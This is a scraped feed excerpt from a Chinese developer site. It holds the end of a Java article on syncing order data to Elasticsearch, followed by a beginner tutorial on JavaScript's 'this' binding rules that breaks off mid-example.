<p>（1）订单微服务 添加依赖</p>
<pre><code class="hljs language-xml" lang="xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>cn.elegent.pipe<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>elegent-pipe-client<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span>
<span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span>
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>（2）订单微服务 创建数据同步处理类</p>
<pre><code class="hljs language-typescript" lang="typescript"><span class="hljs-comment">/**
 * 接受订单数据同步
 */</span>
<span class="hljs-meta">@ElegentPipe</span>(db=<span class="hljs-string">"dkd_order"</span>,table = <span class="hljs-string">"tb_order"</span>)
<span class="hljs-meta">@Slf4j</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">OrderPipe</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">PipeService</span> {

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> <span class="hljs-title class_">OrderEsService</span> orderEsService;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">insertHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getAfter</span>();
        orderEsService.<span class="hljs-title function_">save</span>(<span class="hljs-string">"order"</span>, (<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>,orderMap );
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES插入订单数据{}"</span>,orderMap);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">updateHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getAfter</span>();
        orderEsService.<span class="hljs-title function_">update</span>(<span class="hljs-string">"order"</span>,(<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>,orderMap );
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES修改订单数据{}"</span>,orderMap);
    }

    <span class="hljs-meta">@Override</span>
    <span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-title function_">deleteHandler</span>(<span class="hljs-params">TransmitDTO transmitDTO</span>) {
        <span class="hljs-title class_">Map</span>&lt;<span class="hljs-title class_">String</span>, <span class="hljs-title class_">Serializable</span>&gt; orderMap = transmitDTO.<span class="hljs-title function_">getBefore</span>();
        orderEsService.<span class="hljs-title function_">delete</span>(<span class="hljs-string">"order"</span>,(<span class="hljs-title class_">Long</span>)orderMap.<span class="hljs-title function_">get</span>(<span class="hljs-string">"id"</span>)+<span class="hljs-string">""</span>);
        log.<span class="hljs-title function_">info</span>(<span class="hljs-string">"ES删除订单数据{}"</span>,orderMap);
    }
}
</code></pre>
<p><img src="" alt="" title="点击并拖拽以移动" loading="lazy"/></p>
<p>​</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通]]></title>    <link>https://juejin.cn/post/7575807729722359842</link>    <guid>https://juejin.cn/post/7575807729722359842</guid>    <pubDate>2025-11-23T08:00:36.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7575807729722359842" data-draft-id="7575104251866284042" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通"/> <meta itemprop="keywords" content="JavaScript,前端,Node.js"/> <meta itemprop="datePublished" content="2025-11-23T08:00:36.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="风止何安啊"/> <meta itemprop="url" content="https://juejin.cn/user/2517239724512420"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            快 2026 年了，谁还在为 this 挠头？看完这篇让你彻底从懵圈到精通
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2517239724512420/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    风止何安啊
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-23T08:00:36.000Z" title="Sun Nov 23 2025 08:00:36 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-23
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前言</h2>
<p>各位 前端er 们，谁还没被 JavaScript 里的 <code>this</code> 虐过？这玩意简直就是编程界的 <strong>“变脸大师”</strong>，翻脸比孙猴子还快。一会儿是全局对象，一会儿是某个实例，一会儿又跟着调用场景改头换面，这不就是活生生的 “百变马丁” 吗？写代码时总被它搞得晕头转向，调试半天就因为 <code>this</code> 指向不对，真有种 <strong>“一杯茶一包烟，一个this改一天”</strong> 的崩溃感。如果你还搞不懂 JavaScript 里面的 <code>this</code>,那这篇将让你搞定原理并且拿捏用法，把那些绕人的绑定规则掰扯得明明白白！</p>
<h3 data-id="heading-1">一、为什么要有 this？—— 让代码 “优雅到飞起”</h3>
<p>想象一下，你写了个函数，想在不同对象上复用它。要是没有<code>this</code>，就得每次手动传对象参数，想想都麻烦！<code>this</code>就像个 “智能代词”，悄咪咪地帮我们传递对象引用。通俗来说就是 <code>this</code> 提供了一种更优雅的方式来隐式的传递一个对象引用，可以让代码更简洁易于复用。</p>
<p>比如下面这两种写法：</p>
<pre><code class="hljs language-scss" lang="scss">function <span class="hljs-built_in">identify</span>(context) {
    return context<span class="hljs-selector-class">.name</span><span class="hljs-selector-class">.toUpperCase</span>();
}
function <span class="hljs-attribute">speak</span>(context) {
    <span class="hljs-selector-tag">var</span> greet = 'hello, <span class="hljs-selector-tag">I</span> am ' + <span class="hljs-built_in">identify</span>(context);
    console<span class="hljs-selector-class">.log</span>(greet);
}
<span class="hljs-selector-tag">var</span> myname = {
    name: <span class="hljs-string">'henry'</span>
}
<span class="hljs-attribute">speak</span>(myname);
</code></pre>
<p>我们定义 <code>identify</code> 函数接收对象参数，返回其 <code>name</code> 大写值；<code>speak</code> 函数接收对象，调用 <code>identify</code> 拼接问候语并打印；最后创建含 <code>name</code> 的 <code>myname</code> 对象，传给 <code>speak</code> 执行，输出 <code>hello, I am HENRY</code>。核心是<strong>手动传递</strong>对象参数实现复用。</p>
<p>输出结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1cf3a10c989a48f8bbad9aa01b590edb~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=ndRrkutsgIwH9NLuQh1awex5y9I%3D" alt="image.png" loading="lazy"/></p>
<p>结果没错，<code>henry</code> 确确实实大写了，但每次都要手动传参你自己不嫌麻烦吗？这时候我们请出大名鼎鼎的--<code>this</code>！</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">identify</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">return</span> <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>.<span class="hljs-title function_">toUpperCase</span>();
}
<span class="hljs-keyword">function</span> <span class="hljs-title function_">speak</span>(<span class="hljs-params"/>) {
    <span class="hljs-keyword">var</span> greet = <span class="hljs-string">'hello, I am '</span> + identify.<span class="hljs-title function_">call</span>(<span class="hljs-variable language_">this</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(greet);
}
<span class="hljs-keyword">var</span> myname = {
    <span class="hljs-attr">name</span>: <span class="hljs-string">'henry'</span>
}
speak.<span class="hljs-title function_">call</span>(myname);
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a11d00940b6d4722a15f8e2ae7f6adc0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=mXiVLKZgc7NIU3nAsGcl%2Bo3FJYs%3D" alt="image.png" loading="lazy"/></p>
<p>诶，你会发现，我2个函数都没有传参，但是都输出了结果。这里有2个关键点：</p>
<ul>
<li>用 <code>call</code> 强制让 <code>speak</code> 的 <code>this</code> 指向 <code>myname</code>；</li>
<li><code>speak</code> 内部调用 <code>identify.call(this)</code> 时，<code>this</code> 已绑定 <code>myname</code>，因此 <code>identify</code> 也能访问 <code>myname.name</code>。</li>
</ul>
<p>至于<code>call</code>是个啥，往下看吧，嘿嘿！</p>
<h3 data-id="heading-2">二、this 用在哪？—— “代词” 的舞台</h3>
<p><code>this</code>就像 “变色龙”，在不同场景下指代不同的角色：</p>
<ul>
<li><strong>全局作用域</strong>：在浏览器里，<code>this</code>就等于<code>window</code>（就像全局舞台的 “C 位”）。比如你直接写<code>console.log(this)</code>，打印的就是<code>window</code>对象。</li>
</ul>
<p>比如我在 Google Chrome 上面写<code>console.log(this)</code>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e07785dce0614bf5b46bec9805371ce4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=4rEz48d8iytdOPiD6HijzftVf9o%3D" alt="image.png" loading="lazy"/></p>
<p>但在node.js里，打印出来的是<code>global</code>：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e5ee9a520ea04d23b3bb720ee6908fcd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=gFtVWwP%2FmRm7YcT1iDOyi%2Fl88k8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><strong>函数作用域</strong>：这就是<code>this</code>的 “主战场”了，在这它的身份变化可多了，咱们接着往下看。</li>
</ul>
<h3 data-id="heading-3">三、this 的绑定规则 —— 给 this “定规矩”</h3>
<h4 data-id="heading-4">1. 默认绑定 —— “自由散漫” 的 this</h4>
<p>当函数被<strong>独立调用</strong>时，<code>this</code>就指向<code>window</code>（严格模式下是<code>undefined</code>）。就像你一个人逛街，没对象陪~</p>
<pre><code class="hljs language-ini" lang="ini">var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
function foo() {
    console.log(this.a)<span class="hljs-comment">;</span>
}
function bar() {
    var <span class="hljs-attr">a</span> = <span class="hljs-number">2</span><span class="hljs-comment">;</span>
    foo()<span class="hljs-comment">;</span>
}
bar()<span class="hljs-comment">;</span>
</code></pre>
<p>灵魂拷问：输出结果是多少？肯定有人说<code>2</code>，而且还不少！你不服了，这调用<code>bar()</code>，然后里面在调用<code>foo()</code>, 不应该根据变量提升先找<code>bar()</code>里面的<code>a = 2</code>吗？说明前面还没看懂嘻嘻，当函数被独立调用--就一个<code>foo()</code>，它就是指向全局，不管那些杂七杂八的，你就是一个人逛街，没有对象陪，所以答案就是全局的<code>a = 1</code>。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a379da0232fd4236a4907503ceacc9bc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=t3f4m1wC6QLi%2FfJk2mzjS%2BaXUT0%3D" alt="image.png" loading="lazy"/></p>
<p>最后就是打印出了<code>1</code>，这就是函数的独立调用。</p>
<h4 data-id="heading-5">2. 隐式绑定 —— “依附对象” 的 this</h4>
<p>当函数被<strong>上下文对象调用</strong>时，<code>this</code>就绑定到这个对象上。比如：</p>
<pre><code class="hljs language-ini" lang="ini">function foo() {
    console.log(this)<span class="hljs-comment">;</span>
}
var <span class="hljs-attr">a</span> = <span class="hljs-number">1</span><span class="hljs-comment">;</span>
var <span class="hljs-attr">obj</span> = {
    foo: foo
}
obj.foo()<span class="hljs-comment">;</span>
</code></pre>
<p>好，最后的调用<code>obj.foo()</code>。首先它不是单独调用，那么就要用到<strong>上下文对象调用</strong>，咱们一句话说清核心：<code>obj.foo()</code> 是通过对象 <code>obj</code> 调用函数 <code>foo</code>，所以 <code>foo</code> 里的 <code>this</code> 直接绑定到 <code>obj</code>，最终打印 <code>obj</code> 整个对象。</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/2844f0af6e73459a9f0e9e1847e592e9~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=3pxzCNi920tAcZUMdGKQ6a0m2PI%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-6">3. 隐式丢失 —— “层层剥离” 的 this</h4>
<p>当函数被多层对象调用时，<code>this</code>会指向<strong>最近的那个对象</strong>。是不是有点像小时候玩的游戏🎮 “击鼓传花”，传到最后花落谁家？</p>
<p>好，那看一个例子：</p>
<pre><code class="hljs language-css" lang="css">function foo() {
    console<span class="hljs-selector-class">.log</span>(this<span class="hljs-selector-class">.a</span>);
}
<span class="hljs-selector-tag">var</span> obj = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>,
    foo: foo
}
<span class="hljs-selector-tag">var</span> obj2 = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">2</span>,
    foo: obj
}
obj2<span class="hljs-selector-class">.foo</span><span class="hljs-selector-class">.foo</span>();
</code></pre>
<p>OK，懵了⊙▃⊙吧。怎么回事连续调用2次，最后输出的到底是<code>obj</code>里的还是<code>obj2</code>里的？答案是<code>obj</code>！</p>
<p><strong>关键误区提醒</strong>：</p>
<p>不要以为 <code>obj2</code> 在前面，<code>this</code> 就指向 <code>obj2</code>！</p>
<p><code>this</code> 只看 <strong>「函数执行时的直接调用者」</strong>，和外层嵌套的对象（<code>obj2</code>）无关。如果想让 <code>this</code> 指向 <code>obj2</code>，需要让 <code>obj2</code> 直接调用 <code>foo</code>（比如 <code>obj2.foo = foo; obj2.foo()</code>）。</p>
<p>就好比我们英语的 <strong>就近原则</strong>，离谁近就指向谁！</p>
<p>输出结果：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d4c5549bd148495d90237bfb9a6088ee~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=zez8A4FLcydF5hlgtAmDnOYM6Zo%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-7">4. 显式绑定 —— “强行指定” 的 this（call、apply、bind 三位好室友登场！）</h4>
<p>咱们可以把这三个方法想象成你的三个 “热心室友”：</p>
<ul>
<li><strong>call 室友</strong>：急性子，直接帮函数把<code>this</code>绑定到目标对象，参数一个个传。</li>
<li><strong>apply 室友</strong>：爱偷懒，参数打包成数组传给函数。</li>
<li><strong>bind 室友</strong>：慢性子，先绑定<code>this</code>和部分参数，返回一个 “半成品” 函数，想啥时候调用都行。</li>
</ul>

<pre><code class="hljs language-scss" lang="scss"><span class="hljs-selector-tag">var</span> obj = {
    <span class="hljs-selector-tag">a</span>: <span class="hljs-number">1</span>
}
function <span class="hljs-built_in">foo</span>(x, y) { 
    console<span class="hljs-selector-class">.log</span>(this.a, x + y);
}
foo<span class="hljs-selector-class">.call</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);    <span class="hljs-comment">// call室友出马</span>
foo<span class="hljs-selector-class">.apply</span>(obj, [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>]); <span class="hljs-comment">// apply室友偷懒</span>
const bar = foo<span class="hljs-selector-class">.bind</span>(obj, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>);  
<span class="hljs-built_in">bar</span>();  <span class="hljs-comment">// bind室友慢性子</span>
</code></pre>
<ol>
<li><code>foo.call(obj, 1, 2)</code>：call 室友 “急性子”，直接把 foo 的 this 绑定到 obj，再逐个传入参数 1 和 2 → 打印 obj 的 a（1）和 1+2（3），输出：1 3；</li>
<li><code>foo.apply(obj, [1, 2])</code>：apply 室友 “爱偷懒”，同样绑定 this 到 obj，但参数要打包成数组 [1,2] 传入 → 结果和 call 一致，输出：1 3；</li>
<li><code>const bar = foo.bind(obj, 2, 3); bar()</code>：bind 室友 “慢性子”，先绑定 this 到 obj、预传参数 1 和 2，返回 “半成品” 函数 bar，调用 bar 时才执行 → 打印 obj 的 a（1）和 1+2（3），输出：1 3。</li>
</ol>
<p>结果和我们分析的一样：</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5899e8ff04b94c72a74cace92a0fc362~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=eaESjDe%2B3ptMCkYsWIDShML0ZuQ%3D" alt="image.png" loading="lazy"/></p>
<h4 data-id="heading-8">5. new 绑定 —— “实例专属” 的 this</h4>
<p><code>new</code>关键字就像个 “专属定制工厂”，专门用构造函数为新对象 “量身打造” 身份。当我们用<code>new</code>调用构造函数时，<code>this</code>会直接绑定到这个刚创建的<strong>实例对象</strong>上，相当于工厂把定制好的 “专属身份” 直接赋给了新实例。</p>
<p>但这个 “定制工厂” 有个<strong>特殊规则</strong>,分三种情况:</p>
<p><strong>情况 1：正常定制</strong> —— 返回绑定 this 的实例</p>
<p>当构造函数里没有手动<code>return</code>，或者只<code>return</code>了<code>undefined</code>（默认隐含）时，工厂会按流程完成 “定制”，返回绑定了<code>this</code>的实例对象。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}
<span class="hljs-keyword">let</span> p1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'henry'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1.<span class="hljs-property">name</span>); <span class="hljs-comment">// 输出"henry"</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(p1);      <span class="hljs-comment">// 输出Person { name: "henry" }，this绑定生效</span>
</code></pre>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ee9dfb60533a4af79a7d2e0889f0d080~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6aOO5q2i5L2V5a6J5ZWK:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764489636&amp;x-signature=6FB358AMcLNNu%2B5m7YXSWZe5rZw%3D" alt="image.png" loading="lazy"/></p>
<p><strong>情况 2：放弃定制</strong> —— return 引用类型，返回手动指定的对象</p>
<p>如果构造函数里主动<code>return</code>了一个<strong>引用类型</strong>（比如对象、数组、函数等复杂数据），相当于你给工厂递了一个 “现成产品”，工厂会直接放弃原本的定制流程，返回这个手动指定的引用类型，原本绑定<code>this</code>的实例会被直接忽略。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
